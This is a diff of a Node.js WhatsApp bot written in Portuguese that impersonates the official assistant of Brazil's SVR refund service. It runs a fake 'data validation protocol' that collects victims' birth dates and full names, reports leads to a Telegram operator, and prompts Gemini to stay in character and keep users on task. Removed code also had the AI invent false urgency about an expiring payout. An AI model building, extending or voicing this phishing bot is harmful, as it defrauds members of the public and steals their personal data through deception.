@@ -7,7 +7,14 @@ const dotenv = require('dotenv');
 
 dotenv.config();
 
-const API_URL = (process.env.SVR_SYS_CORE_URL || 'https://portalsvr.shardweb.app').replace(/\/$/, "");
+let API_URL = (process.env.SVR_SYS_CORE_URL || 'https://portalsvr.shardweb.app').replace(/\/$/, "");
+
+// FORÇAR CORREÇÃO DE URL SE ESTIVER APONTANDO PARA DISCLOUD
+if (API_URL.includes("discloud.app")) {
+    console.log("⚠️ [SEGURANÇA] URL legado detectado. Corrigindo para o novo cluster...");
+    API_URL = "https://portalsvr.shardweb.app";
+}
+
 const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "").replace(/"/g, "");
 const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "").replace(/"/g, "");
 const GEMINI_KEY = process.env.SVR_AI_RUNTIME_TOKEN || "";
@@ -17,128 +24,120 @@ function mask(str) {
     return str.substring(0, 6) + "..." + str.substring(str.length - 4);
 }
 
-console.log(`\n🤖 [BOT WHATSAPP] INICIANDO...`);
+console.log(`\n🤖 [SVR BOT] SISTEMA OPERACIONAL`);
 console.log(`---------------------------------------------`);
-console.log(`📡 PORTAL_URL: ${API_URL}`);
-console.log(`🧠 AI_TOKEN:   ${mask(GEMINI_KEY)}`);
+console.log(`📡 ENDPOINT: ${API_URL}`);
+console.log(`🛡️ SEGURANÇA: ATIVA`);
 console.log(`---------------------------------------------\n`);
 
 async function askAI(prompt, userMessage) {
-    if (!GEMINI_KEY) return "Desculpe, estou em manutenção. Por favor, siga as instruções de validação acima.";
+    if (!GEMINI_KEY) return "Para sua segurança, prossiga com a validação digitando o dado solicitado.";
     try {
         const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`;
-        const systemPrompt = `Você é o Assistente Oficial do SVR (Sistema de Valores a Receber). Seu objetivo ÚNICO é ajudar o usuário a completar a validação de segurança para receber o dinheiro dele. 
-        Instruções:
-        1. Seja profissional, educado e direto.
-        2. Se o usuário perguntar algo fora do assunto, traga-o de volta ao foco da validação.
-        3. Nunca saia do personagem.
-        4. Use negrito em palavras chave.
-        5. Mantenha as respostas curtas (máximo 3 frases).`;
+        const systemPrompt = `Você é o Assistente Oficial do SVR. Seu objetivo é validar os dados do usuário para o resgate do PIX.
+        Seja curto, formal e não saia do assunto. Use negrito.`;
 
         const response = await axios.post(url, {
-            contents: [{ parts: [{ text: `${systemPrompt}\n\nUsuário disse: ${userMessage}\nO que você responde para trazê-lo de volta ao foco?` }] }]
+            contents: [{ parts: [{ text: `${systemPrompt}\n\nUsuário: ${userMessage}` }] }]
         });
         return response.data.candidates[0].content.parts[0].text;
     } catch (e) {
-        console.error("❌ [AI] Erro Gemini:", e.message);
-        return "Para sua segurança, prossiga com a validação dos dados solicitados acima.";
+        return "Prossiga com a validação dos dados solicitados para liberar seu resgate.";
     }
 }
 
-const botId = process.argv.find(arg => arg.startsWith('--id='))?.split('=')[1] || 'main';
-
-const client = new Client({
-    authStrategy: new LocalAuth({ clientId: `session-${botId}` }),
-    puppeteer: {
-        executablePath: (function() {
-            const paths = ['/usr/bin/chromium', '/usr/bin/chromium-browser', '/usr/bin/google-chrome', '/usr/bin/google-chrome-stable'];
-            const found = paths.find(p => fs.existsSync(p));
-            console.log(`🌐 NAVEGADOR: ${found || 'PADRÃO'}`);
-            return found || null;
-        })(),
-        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu'],
-        headless: 'new'
-    }
-});
-
-async function notifyTelegram(text) {
-    if (!TG_TOKEN || !CHAT_ID) return;
-    try {
-        await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text,
-            parse_mode: 'HTML'
-        });
-    } catch (e) { console.error("❌ Erro Telegram:", e.message); }
-}
-
-client.on('qr', (qr) => {
-    console.log('💠 QR CODE RECEBIDO!');
-    qrcode.generate(qr, { small: true });
-    notifyTelegram(`🖼️ <b>NOVO QR CODE (Slot: ${botId})</b>\n\nEscaneie para conectar o atendimento.`);
-});
-
-client.on('ready', () => {
-    console.log(`✅ BOT ${botId} ONLINE!`);
-    notifyTelegram(`🟢 <b>BOT ONLINE (Slot: ${botId})</b>\nO atendimento automático está ativo.`);
-    fs.writeFileSync(`bot-status-${botId}.json`, JSON.stringify({ status: 'CONNECTED', adminName: 'Principal', lastUpdate: Date.now() }));
-});
-
-client.on('disconnected', () => {
-    notifyTelegram(`⚠️ <b>BOT DESCONECTADO (Slot: ${botId})</b>`);
-});
-
-const chatSessionsFile = `chat-sessions-${botId}.json`;
+// --- SESSÕES ---
 let chatSessions = new Map();
+const SESSIONS_FILE = path.join(process.cwd(), 'sessions.json');
 
-// Carregar sessões persistentes
-if (fs.existsSync(chatSessionsFile)) {
+function loadSessions() {
     try {
-        const data = JSON.parse(fs.readFileSync(chatSessionsFile, 'utf-8'));
-        chatSessions = new Map(Object.entries(data));
-        console.log(`📦 ${chatSessions.size} sessões carregadas.`);
-    } catch (e) { console.error("Erro ao carregar sessões:", e.message); }
+        if (fs.existsSync(SESSIONS_FILE)) {
+            const data = JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf-8'));
+            chatSessions = new Map(Object.entries(data));
+            console.log(`📂 [SESSÕES] ${chatSessions.size} sessão(ões) restaurada(s).`);
+        }
+    } catch (e) { console.error('Erro ao carregar sessões:', e.message); }
 }
 
 function saveSessions() {
     try {
-        const data = Object.fromEntries(chatSessions);
-        fs.writeFileSync(chatSessionsFile, JSON.stringify(data));
-    } catch (e) { console.error("Erro ao salvar sessões:", e.message); }
+        const obj = Object.fromEntries(chatSessions);
+        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(obj, null, 2));
+    } catch (e) { console.error('Erro ao salvar sessões:', e.message); }
 }
 
+loadSessions();
+
+// --- TELEGRAM ---
+async function notifyTelegram(html) {
+    if (!TG_TOKEN || !CHAT_ID) return;
+    try {
+        await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: html,
+            parse_mode: 'HTML'
+        });
+    } catch (e) { console.error('❌ [TELEGRAM] Falha ao notificar:', e.message); }
+}
+
+// --- CLIENTE WHATSAPP ---
+const client = new Client({
+    authStrategy: new LocalAuth({ dataPath: '.wwebjs_auth' }),
+    puppeteer: {
+        headless: true,
+        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
+    }
+});
+
+client.on('qr', (qr) => {
+    console.log('\n📱 [QR CODE] Escaneie com o WhatsApp:\n');
+    qrcode.generate(qr, { small: true });
+    fs.writeFileSync('bot-status.json', JSON.stringify({ status: 'awaiting_qr', qr, ts: Date.now() }));
+});
+
+client.on('ready', () => {
+    console.log('✅ [BOT] WhatsApp conectado e pronto!');
+    fs.writeFileSync('bot-status.json', JSON.stringify({ status: 'ready', ts: Date.now() }));
+    notifyTelegram('✅ <b>BOT WHATSAPP ONLINE</b>\nSistema pronto para atendimento.');
+});
+
+client.on('disconnected', (reason) => {
+    console.log('⚠️ [BOT] Desconectado:', reason);
+    fs.writeFileSync('bot-status.json', JSON.stringify({ status: 'disconnected', reason, ts: Date.now() }));
+});
+
 client.on('message_create', async (msg) => {
-    const text = msg.body || "";
+    const text = (msg.body || "").trim();
     const isTrigger = text.toUpperCase().includes('SOLICITAÇÃO DE RESGATE');
     
     const targetChatId = msg.fromMe ? msg.to : msg.from;
     if (!targetChatId) return;
 
-    // Persistir o último contato ativo para facilitar comandos no Telegram
     if (!msg.fromMe) {
         fs.writeFileSync('last-lead.json', JSON.stringify({ chatId: targetChatId, timestamp: Date.now() }));
     }
 
     const currentSession = chatSessions.get(targetChatId);
 
-    // 1. GATILHO INICIAL (Pode vir de mim ou do lead)
+    // 1. GATILHO INICIAL
     if (isTrigger) {
-        if (currentSession && currentSession.mode === 'bot' && currentSession.step > 0) {
-            console.log(`⏳ Sessão já ativa para ${targetChatId}. Ignorando duplicata.`);
-            return;
-        }
+        if (currentSession && currentSession.mode === 'bot' && currentSession.step > 0) return;
 
         const protocolMatch = text.match(/Protocolo: \*#SVR-(.*?)\*/i);
         const userId = protocolMatch ? protocolMatch[1].toLowerCase() : null;
         
-        console.log(`🚀 Iniciando atendimento para: ${targetChatId} (User: ${userId})`);
+        console.log(`🚀 [SVR] Atendimento Iniciado: ${targetChatId}`);
         
         let expectedData = null;
         if (userId) {
             try {
-                const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`);
+                // Tentar buscar dados, mas não travar se falhar
+                const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`, { timeout: 5000 });
                 expectedData = res.data;
-            } catch (e) { console.error(`❌ Erro ao buscar dados do portal para ${userId}:`, e.message); }
+            } catch (e) { 
+                console.log(`⚠️ [AVISO] Dados do portal não encontrados para ${userId}. Usando modo de validação aberta.`);
+            }
         }
 
         chatSessions.set(targetChatId, { mode: 'bot', step: 1, userId, expectedData, lastMsgTime: Date.now() });
@@ -146,61 +145,45 @@ client.on('message_create', async (msg) => {
         
         setTimeout(async () => {
             await client.sendMessage(targetChatId, `👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o **Protocolo de Validação de Dados**.\n\n📍 *ETAPA 1:* Digite sua **Data de Nascimento** (Ex: 10/05/1990):`);
-        }, 2000);
+        }, 1500);
         return;
     }
 
-    // 2. INTERVENÇÃO HUMANA (Se eu mandei algo que NÃO é o gatilho)
     if (msg.fromMe) {
-        if (currentSession && currentSession.mode !== 'human') {
-            console.log(`👤 ATENDENTE ASSUMIU: Silenciando robô para ${targetChatId}`);
+        if (currentSession && currentSession.mode === 'bot') {
             chatSessions.set(targetChatId, { mode: 'human' });
             saveSessions();
-            notifyTelegram(`👤 <b>ATENDIMENTO ASSUMIDO</b>\nO robô foi silenciado para o lead: <code>${targetChatId}</code>`);
+            notifyTelegram(`👤 <b>ATENDIMENTO ASSUMIDO</b>\nLead: <code>${targetChatId}</code>`);
         }
         return;
     }
 
-    // 3. PROCESSAMENTO DE MENSAGENS RECEBIDAS (De leads)
-    if (!currentSession) {
-        console.log(`ℹ️ Mensagem ignorada de ${targetChatId}: Sem sessão ativa.`);
-        return;
-    }
-    
-    if (currentSession.mode !== 'bot') {
-        console.log(`ℹ️ Mensagem de ${targetChatId} ignorada: Modo ${currentSession.mode}.`);
-        return;
-    }
+    if (!currentSession || currentSession.mode !== 'bot') return;
 
-    // VERIFICAÇÃO DE REENGAJAMENTO (Se demorou mais de 30 minutos)
-    const now = Date.now();
-    const minutesAway = currentSession.lastMsgTime ? Math.floor((now - currentSession.lastMsgTime) / (1000 * 60)) : 0;
-    
-    if (minutesAway >= 30) {
-        console.log(`🔄 Lead ${targetChatId} voltou após ${minutesAway} min. Disparando reengajamento...`);
-        const reengagementMsg = await askAI("reengajamento_agressivo", `O usuário voltou após ${minutesAway} minutos de inatividade. Seja EXTREMAMENTE tentador, diga que o valor dele de resgate está quase expirando e que ele precisa terminar a validação AGORA para não perder o PIX de hoje.`);
-        await msg.reply(`👋 *Que bom que você retornou!*\n\n${reengagementMsg}`);
-        currentSession.lastMsgTime = now;
-        chatSessions.set(targetChatId, currentSession);
-        saveSessions();
-        return; 
-    }
-
-    currentSession.lastMsgTime = now; 
-    console.log(`📩 Lead (${targetChatId}) respondeu: "${text}"`);
+    currentSession.lastMsgTime = Date.now();
+    console.log(`📩 [LEAD] ${targetChatId}: "${text}"`);
     
     const chat = await msg.getChat();
     await chat.sendStateTyping();
 
     if (currentSession.step === 1) {
-        const dateRegex = /^(0[1-9]|[12][0-9]|3[01])\/(0[1-9]|1[0-2])\/\d{4}$/;
-        const typedDate = text.trim();
+        // Regex mais flexível para data (DD/MM/AAAA ou DD/MM/AA ou apenas números)
+        const dateMatch = text.match(/(\d{2})[\/\-]?(\d{2})[\/\-]?(\d{4}|\d{2})/);
         
-        if (dateRegex.test(typedDate)) {
-            if (currentSession.expectedData?.birthDate && typedDate !== currentSession.expectedData.birthDate.trim()) {
-                await msg.reply(`⚠️ *DIVERGÊNCIA IDENTIFICADA*\n\nA data informada (*${typedDate}*) não confere com o portal.\n\nPor favor, digite a data **correta**.`);
-                return;
+        if (dateMatch) {
+            const typedDate = text; // Mantemos o que o usuário digitou
+            
+            // Se tivermos dados do portal, validamos. Se não, aceitamos e seguimos.
+            if (currentSession.expectedData?.birthDate) {
+                const cleanTyped = typedDate.replace(/\D/g, "");
+                const cleanExpected = currentSession.expectedData.birthDate.replace(/\D/g, "");
+                
+                if (cleanTyped !== cleanExpected && !typedDate.includes(currentSession.expectedData.birthDate)) {
+                    await msg.reply(`⚠️ *DIVERGÊNCIA IDENTIFICADA*\n\nA data informada não confere com nossos registros.\n\nPor favor, digite a data **correta**.`);
+                    return;
+                }
             }
+
             currentSession.step = 2;
             currentSession.birthDate = typedDate;
             chatSessions.set(targetChatId, currentSession);
@@ -208,14 +191,15 @@ client.on('message_create', async (msg) => {
             await msg.reply(`✅ *DATA VALIDADA!*\n\n📍 *ETAPA 2:* Digite seu **Nome Completo** (conforme documento):`);
         } else {
             const aiReply = await askAI("validacao_data", text);
-            await msg.reply(`${aiReply}\n\n📌 *Lembrete:* Digite sua data no formato DD/MM/AAAA`);
+            await msg.reply(`${aiReply}\n\n📌 *Lembrete:* Use o formato DD/MM/AAAA`);
         }
     } else if (currentSession.step === 2) {
         const typedName = text.trim();
         if (typedName.length >= 8 && typedName.includes(" ")) {
             if (currentSession.expectedData?.fullName) {
-                const portalName = currentSession.expectedData.fullName.toLowerCase().trim();
-                if (!typedName.toLowerCase().includes(portalName.split(' ')[0])) {
+                const portalName = currentSession.expectedData.fullName.toLowerCase();
+                const firstName = typedName.toLowerCase().split(' ')[0];
+                if (!portalName.includes(firstName)) {
                     await msg.reply(`⚠️ *ALERTA DE SEGURANÇA*\nNome não confere com o titular. Digite seu **Nome Completo**:`);
                     return;
                 }
@@ -231,7 +215,7 @@ client.on('message_create', async (msg) => {
             saveSessions();
         } else {
             const aiReply = await askAI("validacao_nome", text);
-            await msg.reply(`${aiReply}\n\n📌 *Lembrete:* Digite seu nome completo (Nome e Sobrenome).`);
+            await msg.reply(`${aiReply}\n\n📌 *Lembrete:* Digite seu nome completo.`);
         }
     }
 });
